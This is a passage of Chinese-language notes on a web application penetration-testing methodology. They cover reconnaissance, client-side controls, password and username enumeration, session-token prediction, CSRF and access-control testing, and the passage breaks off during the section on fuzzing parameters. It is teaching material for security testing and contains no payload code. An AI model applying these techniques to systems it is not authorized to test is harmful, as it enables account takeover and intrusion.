手动浏览结束后，可进一步选择部分 URL 做为起点，使用爬虫进行自动抓取。这种方法有时会找到一些漏网之鱼；不过在进行自动抓取前，需要先创建可引起会话中断的链接列表，配置爬虫，避开这些链接； 浏览公开内容 网站的公开内容很可能会被搜索引擎的爬虫抓取过，因此，可以使用搜索引擎和档案库（如 Waybak Machine）来查找与目标应用程序相关的内容； 注意使用搜索引擎的参数来提高搜索效率，例如在 google 中： site，用来指定搜索的目标站点； link，获取链接到目标站点的其他站点； 在搜索引擎中发现的内容有时可能已被目标程序删除，但通过查看页面缓存，有时可以在里面发现一些有效的资源链接； 搜索在应用程序的内容中出现的任何姓名和电邮地址；这些内容有时候可能不在屏幕上显示，而是隐藏在注释中； 除了 Web 搜索外，还应进行新闻和小组讨论搜索， 因为有时候新闻内容可能包括与应用程序有关的技术信息； 检查任何已发布的接口文档，以了解应用程序可能采用的功能名称和参数说明； 发现隐藏的内容 先找到应用程序响应无效资源的规律，以便将这个规律用于枚举过程中的筛查；获取规律的办法：先手动向已知有效和已知无效的资源发起请求，比对返回的响应，看看应用程序在响应有效和无效资源时，有什么特征； 准备一份常见文件名、文件扩展名和常见目录的列表； 了解应用程序开发者的命名方案，以便猜测余下的资源名称；例如某个资源命名为 AddDocument 和 ViewDocument，那很可能存在 EditDocument 和 RemoveDocument 等资源； 查看客户端代码，从中发现与服务端内容有关的线索，HTML 注释和禁用的表单元素也需查看； 结合已知的资源名和目录名，再加第2步准备好的列表，向应用程序发送大量请求，根据第1步的特征筛查响应，以找出任何可访问的隐藏内容； 以上一步找到的内容为基础，再次使用爬虫，对它们进行手动和自动两方面的抓取； 查找第三方内容 使用 Nikto，探查服务端可能使用的任何第三方组件；注意设置 Nikto 的选项以提供探查的效率，例如使用 --root 选项可在指定目录中进行查找；或者使用 -404 选项指定一个字符串，对应用程序自定义的 Not Fount 页面进行标识； 手动核查结果，以找出其中可能有用的信息，避免出现漏网之鱼； 在 Host 消息头中指定 IP 地址，访问应用程序在服务器上的根目录。查看应用程序是否会返回不一样的响应；如果会的话，针对该 IP 地址进行 Nikto 扫描； 请求根目录时，分别设置不同的 User-Agent 值，看服务端是否会返回不同的内容； 枚举标识符函数有些应用程序会在请求参数中携带要执行的函数名称，例如：/admin.jsp/action=editUser 或 /main.php?func=A21，很有意思； 确定任何在请求参数中提交函数名称的链接； 分析它的命名规律，同时找出猜测失败时的响应特征； 准备一份常用的函数名称列表，发送大量枚举请求； 一般来说，应用程序的内容地图是基于 URL 路径来绘制的，但有时可换个思路，尝试基于函数名称，来编写内容地图；先通过枚举找出所有功能路径，然后为它们建立逻辑关系（详见第4章示例）； 调试参数有些应用程序会在 URL 中携带调试参数，以开启调试功能； 选择一个或多个可能使用调试参数的 URL，一般最有可能出现在登录、搜索、文件上传或下载的功能中； 枚举常见的调试参数名称（如 debug、test、hide、source 等）与常用的参数值（如 true、yes、on、1 等）；枚举所有键值对组合，向应用程序发送大量请求（据说 Burp 有个“集束炸弹”功能可以帮忙生成组合）； 分析响应，看是否与非调试状态的响应有所区别； 分析应用程序确定功能 了解为了让应用程序正常运行，需要建立的核心功能，以及每项功能需要涉及的操作； 了解应用程序使用的核心安全机制，以及这些安全机制的工作原理（重点可放在身份验证、会话管理、访问控制等关键的几个机制，以及它们的辅助功能如用户注册、忘记密码等）； 了解外围功能，如错误消息、管理功能、日志功能、站外链接、重定向的使用位置等； 找出任何与应用程序通用样式不一致的界面、参数命名或导航，将它们挑出来进行深入的测试（这些位置很可能使用第三方的组件）； 确定数据进入点 确定应用程序中所有引入用户输入的位置，包括 URL、查询字符串参数、POST 数据、cookie、消息头等； 了解应用程序使用的所有自定义的数据传输或者数据编码方法，例如自定义的查询字符串格式、被提交数据是否使用键值对或者其他表示方法； 了解所有在应用程序中引入的用户可控制的，或者第三方控制的带外通道，例如显示和处理 SMTP 邮件； 确定所使用的技术 找出客户端代码所使用的技术，例如表单、JS脚本、cookie、Java Applet、ActiveX 控件、Flash 对象等； 尽可能确定服务端所使用的技术，包括使用何种语言、框架、与数据库和电子邮件交互的组件等； 检查响应中的 Server 消息头，或者其他 HTTP 消息头、HTML 源代码注释中可能出现的标识符，通过标识符判断服务端所使用的服务器软件；有时，应用程序的不同功能可能使用不同的后端组件进行处理，因为可能会找到多种不同的标识符； 使用 Httprint 工具，分析 Web 服务器指纹； 检查上一步内容解析过程收集的信息，找出有助于了解服务端使用何种技术的关键信息，例如文件扩展名、目录、URL 序列等；检查会话令牌和 cookie 名称，并通过 google 搜索这些名称背后所使用的技术； 找出那些看起来有点意思的脚本名称和查询参数，因为它们可能属于第三方组件；使用 inurl 选项通过 google 搜索相关内容，找出同样使用这些第三方组件的其他站点。对这些站点实施非侵入审查，有可能会发现一些在目标应用程序中隐藏的功能和内容； 解析受攻击面 了解和推测服务端的应用程序内部结构和功能，以及为实现某些客户端功能的后台工作机制，例如查询订单的功能，大概率需要跟数据库发生交互； 罗列好功能后，再思考每一种功能背后可能发生的漏洞，例如文件上传功能可能存在路径遍历漏洞、用户间通信可能存在 XSS 漏洞、联系客服功能可能存在 SMTP 注入漏洞等； 制定攻击优先级计划，优先攻击最有用的功能以及与之相关的最严重的潜在漏洞； 测试客户端控件 客户端数据传送机制 找出所有在客户端传送数据的场景，包括但不限于隐藏的表单字段、cookie、URL 参数等； 根据所传送数据的名称、值和出现的位置，猜测它们在服务端应用程序逻辑中的用途； 尝试修改数据的值，看是否会对服务端的应用程序产生影响，包括了解应用程序是否接受任意值，还是会进行过滤；以及是否会干扰应用程序的逻辑，是否会触发或破坏一些安全机制； 如果客户端传送模糊数据，可尝试破译模糊算法，以便在模糊数据中写入任意指定值；以及可尝试不修改数据，而是在不同场景中提交相同的模糊数据，看是否会干扰应用程序的逻辑； 如何应用程序在客户端使用 ASP.NET ViewState，对其进行测试。看是否可以破坏它，或者查看其中是否包括敏感数据（不同页面，使用 ViewStatue 的方式可能有所不同） 使用 Burp 套件中的 ViewState 分析器，看 EnableViewStateMac 选项是否开启，如果开启的话，则数据不可修改，因为服务端将校验客户端提交的内容是否与发出时一致，如果修改，会触发错误； 查看解码后的 ViewState，看是否包含敏感数据； 尝试一个被解码的参数值，再重新编码，存入 ViewState；如果服务器接受修改后的 ViewState，则说明 ViewState 可被用于提交任意的输入。因此，可对其包含的数据进行和普通参数一样的测试； 客户端输入控件 找出所有客户端对输入进行限制的场景，了解其限制规则； 违法这些规则提交输入，轮流测试每一个参数，看服务端是否使用相同的输入确认； 检查所有的 HTML 表单，找出禁用的元素，如禁用的灰色按钮；并尝试与其他表单一起提交，看应用程序如何处理。如果发生异常行为的，思考是否可以在攻击过程中利用这种异常行为（代理服务器可以通过配置规则，自动启用禁用的字段，提高攻击效率，例如 Burp 套件中的 \"HTML修改\" 选项） 测试浏览器扩展组件了解组件功能 通过代理服务器拦截客户端和服务端之间的流量，监控其数据（如果数据被序列化，则可以使用套件的工具对其反序列化）； 有了数据后，查看在客户端中呈现出来的功能，从而了解这些数据被如何使用和呈现，能够为用户带来什么功能价值；必要时，可以重复发送关键请求，或者修改服务端返回的响应，了解功能如何实现； 反编译组件有些应用程序会使用一些厚客户端组件，例如 Java 的 applet 通过拦截代理服务器查找特定的文件类型，另外还可以在 HTML 源代码中进行查找，例如 applet 标签等； .class 或 .jar 文件：使用 Java .swf 文件：Flash .xap 文件：Silverlight 找出所有调用 applet 的地方，并确定 applet 返回的数据，是否被提交到服务端；applet 返回的数据有时可能会经过模糊处理，此时不能直接修改它，因为直接修改会被服务端发现和拒绝，导致数据无效；需要先反编译 applet，得到其源代码，之后才能对数据进行修改； 在浏览器输入 URL，下载 applet 字节码，使用适当的工具对其进行反编译（有时下载的文件可能被压缩过，可使用解压工具进行解压，例如 WinRAR 或 WinZip）； Java 的 applet：可使用 Jad Flash：SWFScan、Flasm、Flare； Silverlight：.NET Reflector； 分析反编译后的源代码，了解其返回的数据是如何处理和计算出来的； 查看源代码中，是否包含对任意数据进行模糊处理的通用函数； 如果源代码中有对输入进行检查，可对其进行修改，让检查失效； 修改后，再使用编译工具，将源代码重新编译为原本的格式； 附加调试器如果客户端程序很大，反编译、阅读和修改其源代码的工作量很大，而且也很容易出错，一个抄小路的办法是使用调试器，追踪某个功能的执行过程，理解其处理逻辑，然后在合适的位置设置断点，修改相应的值，得到我们想要的最终预期结果即可。 JavaSnoop； Silverlight Spy； 测试 ActiveX 控件 找出所有使用 ActiveX 控件的地方。可从拦截的请求记录中查找 .cab 文件名，或者在 HTML 页面源代码中搜索 OBJECT 标签 同样可以使用调试器来修改和操纵 ActiveX 控件的返回值； 可使用 COMRaider 等工具枚举控件的各种方法。根据 ActiveX 控件的方法名称和参数，猜测其用途。检查是否能够操作这些方法，从而影响控件的行为，例如避开执行的输入确认机制； 如果控件的功能是收集检查客户端计算机的相关信息，则可以使用第三方工具（如 Filemon、Regmon 等）监控控件收集到的信息；然后通过修改客户端注册表中的值，或者创建相应的数据项，来影响控件的行为； 探查控件是否存在可用来攻击其他用户的漏洞；可修改 HTML 调用控件的源代码，修改参数，监控控件的处理结果； 查找控件有无存在危险的方法，例如搜索 LaunchExe 名称； 使用 COMRaider 对控件进行模糊测试，看是否存在缓冲区溢出漏洞； 测试验证机制 了解验证机制 了解应用程序使用的验证机制，如用户名密码表单、证书、多重验证； 了解所有与验证相关的功能，如登录、注册、忘记密码等； 如果应用程序不能自助注册，则尝试通过其他方法搞到几个账户； 测试密码强度 寻找应用程序中关于密码强度的最低要求； 在注册页面或密码修改页面，使用不同强度的密码，对实际的密码强度规则进行测试，例如短密码、纯数字密码、全小写或全大写密码、单词型密码、和用户名一致的密码等； 测试服务端密码验证机制：例如先设置一个足够长（如12个字符）且复杂的密码（包含大小写、数字和特殊符号），然后尝试使用这个密码的各种变化形式进行登录（例如删除最后一个字符、改变大小写、删除特殊字符等）；如果某种尝试取得成功，不要停下来，继续测，直到摸清服务端的整个密码验证机制； 了解清楚最低密码强度要求，以及服务端的密码验证机制后，使用这些信息来枚举可能有效的密码值，以提高攻击成功概率； 尝试枚举可能存在的内置账户，它们很可能并不满足最低密码强度要求； 用户名枚举 找出所有提交用户名的位置，例如可见字段、隐藏字段、cookie 等；（这些位置通常为登录、注册、修改密码、退出账户、激活账户等）； 在每一个提交用户名的位置，故意先提交一个有效用户名的请求，然后再提交一个无效用户名的请求，比如这两个请求之间的差异，以便后续用于筛查枚举出的有效用户名（这些差异可能发生在可见的 HTML 内容、状态码、不可见的 HTML 源代码中，有时则可从服务端的响应时间做出判断）；可以使用一些第三方工具（如 WebScarab）对返回的 HTML 内容进行自动比对，快速找出差异）； 当找到差异后，再提交一组或多组有效+无效的用户名进行重复测试，然后从差异中寻找规律； 尝试通过应用程序其他方面的漏洞（例如信息泄露、日志、注册用户列表、源代码注释等），获取尽可能多的有效用户名； 分析是否有可能利用一些使用用户名参数的功能，对有效用户名进行枚举，例如注册功能，当尝试输入一个已经存在的用户名时，会有提示； 失败次数上限 找出所有提交密码的位置（通常为注册页面、修改密码页面）；如果修改密码页面能够提交任意用户名，则该功能有可能用于猜测密码； 在每一个位置，先提交多组正确的用户名（受控账户）+ 错误密码的请求，监控应用程序的响应，找出响应之间的差异（如果经过10次登录失败后，账户还没有锁定，则可以再提交一个包含有效密码的请求，看是否能够顺利登录，如果可以的话，说明应用程序很可能并没有设置失败次数上限的账户锁定机制）； 如果没有受控账户，则只能通过枚举或猜测一个有效的用户名，然后使用这个用户名进行测试，看超过一定的失败次数后，是否会导致账户锁定（这个方法的缺点是会导致一些用户的账户被冻结锁定） 测试忘记密码功能 确定应用程序是否有忘记密码的功能（正常都有）； 使用一个正常的受控账户，完整整个忘记密码的流程，了解其工作机制（有些是发邮件，有些是询问问题、有些是发短信等）； 如果机制是询问答题，则确定这些问题是否由用户在注册时设定或选择的；如果是的话，可使用多个受控账户来收集这些问题，看里面是否有部分问题的答案较容易枚举猜测出来； 如果机制是密码暗示，使用跟上一步相同的步骤，收集密码暗示，看是否有容易猜到答案的暗示； 使用一个受控账户 + 多个错误答案进行测试，看是否会触发账户冻结；如果不会，则意味着可以使用枚举攻击； 如果机制是发送邮件，则使用受控账户接收多个邮件，分析邮件中收到的账户恢复 URL 是否存在规律，能否利用它猜测出发给其他用户的 URL；同时，确认是否有可能控制收件地址； 测试“记住我”功能 确定应用程序是否有“记住我”的功能，如果有的话，激活它，并分析它的工作原理； 有些“记住我”的功能可让用户再次登录时不需要输入密码，分析其工作原理； 检查该功能是否使用本地存储的 cookie，如果有的话，分析 cookie 是否包含用户的身份信息； 通常 cookie 会经过模糊处理，但可以通过多个非常相似的用户名，来分析模糊处理是否存在规律，如果有的话，就有机会进行逆向工程； 根据找到的规律，尝试修改 cookie 内容，看是否能够伪装成其他用户登录； 测试伪装功能 查找应用程序中是否存在伪装漏洞，即 A 用户可伪装成 B 用户并查看其数据； 从用户提交的数据中，查找是否有哪项数据可用于伪装身份，尝试修改这个数据，看能否伪装成其他用户，尤其是能够提升权限的管理员账户； 在实施密码猜测攻击的过程中，特别留意是否以下现象，即一个账户对应多个密码，或者多个密码对应相同账户；这个现象意味着开发人员很可能设置有后门密码，运营人员利用该后门密码可登录任意用户的账号； 测试用户名唯一性 如果应用程序提交自助注册的功能，并允许用户填写自己想要的用户名，则可以尝试使用不同的密码注册相同用户名，看应用程序是否会报错，如果会的话，有可能可以利用该报错功能，来枚举有效的用户名； 注册相同用户名时，如果应用程序没有报错，就有意思了。此时可将 A 账号的密码，修改成与 B 账号一样，然后进行登录，观察应用程序的反应；之后，再尝试使用相同的账号和密码进行注册，观察应用程序的反应；（有些应用程序，可能使用账号+密码的组合，作为用户身份的标识）； 如果两个账号的用户名和密码发生冲突时，应用程序会报错，则可以利用该功能来猜测其他用户的密码；先枚举有效的用户名，再枚举密码进行注册。当某个组合出现报错时，则说明该用户名 + 密码可能已经被注册过了； 如果两个冲突的账号+密码也不会报错，则进行登录，看两个账号的身份是否会互窜，使得 A 账号可以访问 B 账号的数据； 测试密码可预测性 如果用户名和密码是由应用程序自动生成的，则找出名称上相连的账号和它们的密码，观察这些密码之间存在规律； 如果用户名的生成是有规律的，则往后推，枚举一组很可能有效的用户名，使用这些用户名来猜测密码； 如果密码的生成是有规律的，则可以使用该规律往前推，枚举可能有效的密码，然后和已经收集的有效用户名进行组合，实施猜测攻击； 检测不安全的密码传输 遍历所有需要传输密码的位置，例如注册、登录、密码修改、查看和更新个人信息等功能； 配置代理服务器的拦截功能，对特殊字符进行标记，以便让拦截器找出在哪些位置传输密码； 如果在 URL 参数中传输，则密码很可能会在浏览器历史记录、屏幕、服务器日志，以及 Referer 消息头（当访问第三方链接时）中泄露； 如果密码保存在 cookie 中，则可通过 XSS 攻击或本地隐私攻击获得； 如果密码从服务端传送回客户端，则攻击者有可能通过会话管理漏洞、访问控制漏洞、XSS 漏洞等方式获得证书； 如果密码在传输过程中没有加密，则可能被传输过程中的窃听者获取； 如果使用 HTTPS 传输，但是使用 HTTP 加载表单，则存在中间人攻击漏洞，攻击者可以利用该漏洞获得密码； 检测不安全的密码分配 有些应用程序可能使用某种第三方渠道来创建账号或分配初始密码，例如通过发送电子邮件，或者寄送信件等； 如果应用程序使用 URL 来激活账号，则可以尝试连续注册几个账号，然后分析收到的 URL，看是否存在生成规律； 如果有规律，尝试预测应用程序最近生成的 URL，尝试使用这些 URL 来激活最近注册的用户账号； 尝试重复访问激活 URL，看应用程序如何反应；如果会被拒绝，则在重复访问 URL 之前，先冻结账号，然后看这个 URL 能否使用； 尝试看能否通过激活 URL 为账号设置新密码； 测试不安全的密码散列 如果获取到了大量的散列密码，通常这些密码共用某个散列值。此时，可尝试使用最常见的密码进行登录，如果可以登录成功，那么跟散列密码中出现频次最高的密码，很可能可以对应得上； 使用离线的第三方散列算法工具（例如彩虹表）破解明文值; 测试逻辑缺陷测试故障开放条件 罗列出所有应用程序要求客户端提交用户凭据的功能（例如登录、修改密码等）； 使用受控账户访问以上功能，记录所有请求参数； 重复访问这些功能，但是轮流对参数进行修改，以测试应用程序的代码逻辑，这些修改包括： 提交空字符串； 删除键值对； 提交非常长的值； 提交非常短的值； 字符串代替数字； 数字代替字符串； 以相同的值，多次提交同一个命名参数； 以不同的值，多次提交同一个命名参数； 仔细检查服务端返回的响应，如果发现异常，进一步测试； 基于异常，添加其他异常参数组合，进一步测试和扩大逻辑缺陷； 测试多阶段处理机制 如果应用程序的验证功能涉及多个请求，并在不同的请求中提交凭证，则尝试确定每个请求，并记录每个请求所使用的参数； 重复访问这些功能，修改提交请求的顺序，测试应用程序的处理逻辑，测试方法包括： 以不同的顺序完成所有阶段，到达目标阶段； 轮流直接进入每一个阶段，然后正常完成后续的阶段； 重复访问功能，轮流省略其他的每一个阶段，然后正常访问后续的阶段； 根据响应结果，进一步有针对性的修改访问顺序，测试和扩大应用程序潜在的逻辑缺陷； 查看是否有某些信息，在各个阶段都重复提交（有可能是由用户主动提交，也有可能是隐藏在表单、cookie、或预设的 URL 查询字符串中）；尝试在不同的阶提交不同的值（有效的，无效的），观察应用程序的响应，看提交的参数是否是多余的，或者在某个阶段确认后，后续应用程序就自动信任它，还是在不同的阶段都会检查；尝试利用多阶段漏洞获得未授权的访问，或者降低多阶段机制所要达到的预期控制目标； 仔细查看客户端发送的请求中的所有参数，有可能应用程序使用这些参数跟踪状态，尝试这些参数，破坏应用程序的逻辑； 有些应用程序会在每个阶段中添加一个随机质询，如有，则可对其进行测试： 如果质询参数跟用户的其他参数一起提交，则尝试能否改质询的键值，选择自己的质询； 使用相同的用户名，重复访问同一个阶段，但质询是否会不断变化，如果会的话，可以重复访问这个阶段，直到出现自己想要的质询； 枚举密码 分析所有在应用程序中找到的漏洞，从中筛选出可利用来实现预期目标的漏洞，例如实现用另外一名用户的身份进行登录；如有可能，最好能实现以管理员的身份进行登录； 在实施攻击之前，应该将应用程序的防御机制纳入考虑，提交攻击效率；例如在枚举用户名时，不要选择随机密码，而是使用最常用的密码，这样有一定概率会命中密码，不至于每个枚举的用户名，全部使用掉一次错误机会。使用广度优先，而不是尝试优先的方法来枚举，并且依次使用最常用的密码，避免同一个账户短时间内太多失败请求，导致账户被冻结； 猜测密码时，应该将密码强度规则和长度规则纳入考虑，提前筛查掉不满足强度要求或长度规则的密码； 使用自动化工具来提交枚举攻击效率； 测试会话管理机制 了解会话管理机制 了解应用程序是如何管理会话状态的。例如是否在每次的请求中使用令牌来标记用户的身份；有些应用程序可能没有使用令牌，而是使用一个加密或模糊处理过的表单来保存用户状态信息（相当于将状态保存在客户端，服务端是无状态的），或者使用 HTTP Authentication 技术来维持状态（它的原理很简单，就是浏览器将用户名和密码等信息保存下来，如果某个 URI 需要验证，浏览器就自动发出凭据，用户无感知）； 如果应用程序使用令牌的话，因为令牌可有多种渠道传送，例如 cookie、查询字符串、隐藏表单、消息体等；因此，可对它们逐个进行排查，看到底是哪个；有时候可能多个渠道同时使用，但实际上不同渠道的值，由不同的后端组件处理。有些看起来很像是令牌的数据，其实并没有用，例如负载均衡亲和性功能所提供的令牌； 找一个必须依赖令牌的页面，例如显示用户个人令牌的页面，然后依次删除请求疑似令牌的参数，看返回的响应是否正常；当出现异常时，即可确认该参数应该是会话令牌； 有些应用程序并没有使用令牌中的完整令牌，而只使用了部分令牌，因此，在找到令牌后，可轮流修改一个字节的值，然后发送请求，看应用程序能否正常返回响应；如果有部分值并未用于确认用户身份，则可以忽略它们； 测试令牌的含义 收集令牌：在不同的时间，以不同的账号，登录应用程序，收集应用程序发布的令牌；如果应用程序能够自助注册，则用多个名称相近的账号注册（名称只有一个字符的差别，相同长度不同字符，或者相同字符不同长度）；如果注册时还需要提供额外的身份信息，例如电子邮件，则该信息说不定也会参与到令牌的生成中，因此，也可以对该字段进行系统修改（每两个邮件之间只相关一个字符）； 分析收集到的所有令牌，观察其中是否包含与用户名或者其他用户身份相关数据（如电子邮件）有关的内容； 观察令牌是否使用某种明显的编码或者模糊方案； 观察用户名长度与令牌长度是否有关，如果相关，则说明很可能使用了模糊处理或某种编码机制； 如果用户名包含相同的字符，则观察令牌中是否包含使用 XOR 异或运算结果的相应序列； 观察令牌是否仅包含十六进制序列，如果是，则说明可能经过了十六进制的编码处理； 观察令牌是否包含等号，以及仅包含 base64 字符集； 如果从令牌中可以观察到规律，则测试是否可以利用这些规律发动攻击，例如利用规律猜测用户程序发给最近用户登录的令牌，然后尝试利用该令牌登录某个依赖令牌的页面，看能否成功； 测试令牌的可预测性 快速重复访问某个可返回新令牌的请求，以大量获取连续生成的会话令牌； 观察这些令牌样本，尝试从中寻找规律；此时可使用工具如 Burp Sequencer 来对令牌的随机性进行统计测试；一些注意事项如下： 令牌中可能部分数据不参与用户身份确认，因此可以忽略它们，只关注那些参与身份验证的内容； 如果看不贴出来令牌数据的类型，则可以尝试多种编码方案（例如 Bases64 ）对其进行解码，看能否转化成更有意义的数据（有时可考虑多种编码方案的组合）； 分析解码后的令牌是否存在规律，计算每两个连续值之间的差；有可能令牌表面看起来没有规律，但是从差值入手，就可以发现规律；这种差值规范可用于提高蛮力攻击的效率； 等待几分钟后，再使用前面的方法重新获取一遍令牌，以观察令牌的生成是否跟时间因素有关； 如果已经找出了一定的规律，再使用一个不同的 IP 地址获取另外一组令牌样本，检查规律是否仍然存在（排查令牌的生成与 IP 地址有关）；以及看能否使用第一组令牌，推导出第二组令牌； 如果已经找到规律和时间依赖关系，则检查是否可以利用该规律，猜测最近发布的新令牌，尝试使用新令牌登录； 另外可以使用 Burp Intruder 工具，对令牌中的每个位进行翻转修改，看是否会造成令牌失效，或者变成另外一名用户的身份； 检查不安全的令牌传输 以正常方式依次访问应用程序，从主页开始，到登录，到访问其他所有功能。记录所有发布令牌的位置，并留意哪些部分使用 HTTP 通信，哪些使用 HTTPS 通信（可通过拦截器的日志观察到这些信息）； 如果应用程序使用 cookie 字段传送信息，则观察 cookie 值，看是否启用了 httpOnly 和 Secure 选项； 如果令牌是通过 HTTP 传送的话，则令牌很容易被拦截； 如果应用程序未登录前使用 HTTP，在登录后使用 HTTPS，则留意登录后是否发布了新令牌，如果没有发布新令牌，仍然使用旧令牌，则旧令牌在 HTTP 阶段就已经可以被拦截了； 如果进入了 HTTPS 访问的页面后，页面上存在 HTTP 链接，则可以尝试访问它们，观察此时提交的令牌是否仍然有效，还是会被服务端终止； 检查日志中泄露的令牌 如果在解析应用程序过程中，发现应用程序有日志、管理、监控等功能，那么留意这些功能是否泄露会话令牌；检查访问这些功能的权限。如果只有管理员能够访问，低权限用户访问不到，则看有没有其他漏洞可加以利用，来协助访问这些功能； 有时候，某些特殊的原因，会导致开发者会在 URL 中传送令牌；此时如果用户访问站外链接，会导致在 Referer 消息头中泄露令牌；因此，特别留意是否有某个页面，可以被任意其他用户查看访问，同时用户可以在该页面插入任意的站外链接，例如个人自我介绍页面； 如果能够收集到大量的其他用户令牌，则对它们进行排查，看里面是否有某个令牌刚好属于管理员； 测试令牌会话映射 用同一个账号，在不同的浏览器或不同的电脑登录应用程序，看登录后的两个会话是否同时有效，如果是的话，说明应用程序支持并行会话。这将使得攻击者即使使用其他用户的身份登录，也不会被检测出来； 用同一个账号，在不同的浏览器或不同的电脑登录并退出应用程序，然后查看是否会发布新令牌，还是仍然有原来的旧令牌；如果旧令牌仍然有效，则开发者对会话的使用有错误，在用户退出后，没有及时终止会话。而是使用持久性的某个字符串来代表用户身份，非常危险； 如果令牌的内容包含某种特定的结构和意义，设法将有意义的部分和无意义的部分标识出来；尝试修改其他跟用户身份有关的部分，让其指向其他用户，然后用修改后的令牌登录，看是否有效； 测试会话终止 检查应用程序是否会执行会话终止 登录，获得令牌 等待一段时间，用该令牌访问受保护页面（如个人资料页）； 如果页面正常显示，说明令牌依然有效； 重复上述步骤，了解令牌的有效期 ； 如果一个令牌在连续提交请求的很长一段时间内（如几天），都一直有效，有可能它的有效期是按照最后一次请求来计算的，此时可配置 Burp Intruder 之类的工具递增每次请求之间的间隔。例如每次的间隔，都是上一次的2 倍； 检查退出功能是否真正起作用；登录，退出，使用令牌再次访问受保护页面，如果访问成功，则说明服务端在用户退出后，并没有真正关闭会话； 测试会话固定 没有登录的用户也会得到令牌，并且在登录后，令牌不变，则存在会话固定漏洞； 如果登录后才发布令牌，再次访问登录页面，用另外一个账号登录，如果此时应用程序没有发布新令牌，则也同样存在会话固定漏洞； 观察令牌的格式，尝试使用一个符合格式，但值是虚构的令牌进行登录。如果可以登录成功，则说明有会话固定漏洞； 如果应用程序有发布令牌，但没有登录功能。在显示某些敏感数据时，会使用令牌，则可能存在会话固定漏洞。可用前三种方法，尝试访问敏感数据； 检查 CSRF 如果应用程序完全依靠 HTTP cookie 来传送令牌，则它有可能容易受到 CSRF 攻击； 分析应用程序的关键功能，查看执行这些功能的请求，其参数能否由攻击者完全自行设定，例如参数中不包含任何用于验证身份的令牌，如令牌、随机数或者密码等；那么这些功能有很大的漏洞，可被攻击者轻易利用； 攻击者可以创建一个 HTML 页面，在无须用户执行任何动作的情况，自动将请求发送出去； GET 请求：将目标 URL 放在 标签中即可； POST 请求：做一个表单，参数默认址设置好。并 JS 代码监听页面加载事件，加载时，触发发送该表单； 如果应用程序为了防御 CSRF 攻击，要求在请求中提交令牌，则可以使用测试会话令牌的办法，对页面上的令牌进行可靠性测试；并测试应用程序是否存在 UI 伪造漏洞，如果有的话，也可用于突然 CSRF 防御； 检查 cookie 作用域 如果应用程序使用 cookie 来传送令牌，则检查 cookie 的相关属性，例如其作用域、路径等； 如果 cookie 的使用范围很宽泛，例如指向根目录。那么攻击者有可能利用服务端使用相同根目录的其他应用程序发布的 cookie 来访问，即用 A 程序发布的 cookie，来访问 B 程序。两个程序共享 cookie 根目录； 如果应用程序以它自己的域名作为 cookie 的有效范围，但如果它的子域上面存在其他应用程序的话，也同样存在上一步中的相同问题（当然，有可能它的子域上面，并没有运行任何其他程序）； 找出那些使用路径进行隔离的场景，利用跨站点脚本破坏这种隔离； 找出所有应用程序发布的 cookie 的域名和对应的路径，从这些域名和路径中，排查是否存在其他应用程序，并确定是否可以使用相同的 cookie 访问它们；以及反过来，是否可以利用它们获得 cookie，访问目标应用程序； 测试访问控制 了解访问控制要求 根据应用程序的功能，分析其访问控制机制 垂直隔离：访问不同的功能，需要不同的权限； 水平隔离：相同功能，访问不同的数据，需要不同的权限；例如普通用户只能看自己的数据，管理员可以查看所有用户的数据； 根据应用程序解析结果，找出那些最有可能用来实施权限提升攻击的功能区域与数据资源类型； 为了提高测试效率，最好先获得大量不同垂直权限和水平权限的账号；如果应用程序允许自助注册，那么获得大量水平权限账号是很容易的。至于不同垂直权限的账号，有可能也允许自助注册。如果不行，则需要利用某个漏洞，来访问某个高权限账号；或者直接联系应用程序所有者，让其帮忙开通账号进行测试； 使用多个账号测试 如果存在垂直权限隔离，那么先使用高权限账号，访问整个应用程序，确定它能够访问的所有功能；然后，再使用一个低权限账号，访问上述所有功能，看哪些功能被隔离了。具体办法如下： 使用高权限账号登录，开启 Burp 工具，监听流量，生成站点地图； 检查站点地图是否完整，已包含待测试功能； 退出高权限账号，使用低权限账号登录； 使用比较站点地图的功能，看低权限用户是否能够访问原高权限账号访问过的那些功能； 如果存在水平隔离，则使用两个拥有相同垂直权限的不同账号，尝试用 A 账号访问 B 账号的数据；一般通过修改请求中的标识符来指定访问其他用户的资源； 手动关键的访问控制：检查每个用户权限下可访问的资源，然后使用未授权的账号，尝试对这些资源发起请求； 在测试访问控制时，特别注意多阶段功能，对每个阶段分别进行测试。看应用程序是否假设当前阶段的请求，已经通过了上个阶段的测试； 使用有限的权限测试 如果没有拥有多个不同垂直权限和水平权限的账号，则测试访问控制漏难度很大，因为不知道所有资源的 URL、标识符、参数等重要信息，导致很多漏洞难以发现； 假设测试员只能使用低权限账号进行测试，在解析应用程序的过程中，有可能会找到访问高级功能的 URL（如管理功能），如有的话，可尝试利用其中的漏洞提高账号的权限； 大多数受到水平隔离的资源，会使用某个标识符来对数据进行访问。因此，可以尝试生成一系列紧密相连的标识，识别标识符之中是否存在规律，用找到的规律来猜测其他标识符； 使用自动化工具，使用枚举出的标识符发起资源请求，看能否成功； 测试不安全的访问控制方法 有些应用程序很搞笑，通过客户端传输的参数来控制权限，例如 edit=false、access=read 等；如果发现这类型的参数的话，可尝试修改它们，看服务端如何反应； 有些应用程序使用 Rerefer 字段来控制权限，仅当 Referer 字段的值指向某个特定来源的时候（例如管理员才能访问的 URL），才允许访问当前资源；在访问特权页面时，留意 Referer 消息头的值，并尝试修改这个值，看是否会导致访问失败，如果会的话，说明应用程序很可能基于该字段控制权限； 如果应用程序允许使用 HEAD 方法，说明服务端可能使用某种容器托管方案，可进一步测试是否存在托管漏洞； 测试基于输入的漏洞很多重要的漏洞，都源于未对输入进行严格检查造成的，这种漏洞可出现在应用程序的任意位置；通过一组预生成的有效攻击荷载，轮流对请求中的每个参数进行测试，是探查这类漏洞的通用方法； 模糊测试所有请求参数 找出所有传递参数的位置，通常这些位置包括：查询字符串、消息主体、消息头（如Referer、User-Agent、Cookie 等）； 使用自定义脚本或者第三方工具，轮流对每一个参数进行单独的测试；在 Burp 套件中，可将拦截到的请求发送到 Intruder 模块进行处理即可； 配置一组有效的攻击荷载（可选择一个预告设定的列表，或者加载外部文件）；如果对每个参数都发送所有攻击荷载，显示不是效率最高的做法，可针对那些最常见的漏洞优先安排测试，这些常见漏洞包括： SQL 注入： XSS 与消息头注入： 命令注入： 路径遍历： 脚本注入： 文件包含： 为了便于理解，上一步截图中的有效攻击荷载都是以字面量显示，实际中，由于有些字符属于 HTTP 规范的关键字，因此在使用的时候，需要对它们进行 URL 编码；通常情况下，Intruder 工具会对它们进行编码（除非该选项被禁用了） 除了发送模糊请求外，还需要配置一些异常关键字和模糊参数本身（例如 Intruder 中的 